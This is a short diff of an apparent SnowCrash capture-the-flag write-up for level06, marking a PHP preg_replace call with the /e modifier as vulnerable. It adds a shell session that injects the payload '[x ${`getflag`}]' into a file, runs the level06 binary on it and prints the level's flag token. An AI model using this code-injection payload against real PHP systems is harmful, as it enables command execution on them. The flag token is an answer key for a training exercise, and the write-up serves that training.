@@ -33,7 +33,7 @@ _______________________________________________________________
 	function x($y, $z)
 	{
 		$a = file_get_contents($y);
-		$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+		$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); <<<<--- the vulnerable line matches "[x anything]"
 		$a = preg_replace("/\[/", "(", $a);
 		$a = preg_replace("/\]/", ")", $a); return $a;
 	}
@@ -43,3 +43,11 @@ _______________________________________________________________
 ?>
 _______________________________________________________________
 
+level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /dev/shm/x
+level06@SnowCrash:~$ cat /dev/shm/x
+[x ${`getflag`}]
+level06@SnowCrash:~$ ./level06 /dev/shm/x
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+
+ :D :D :D 
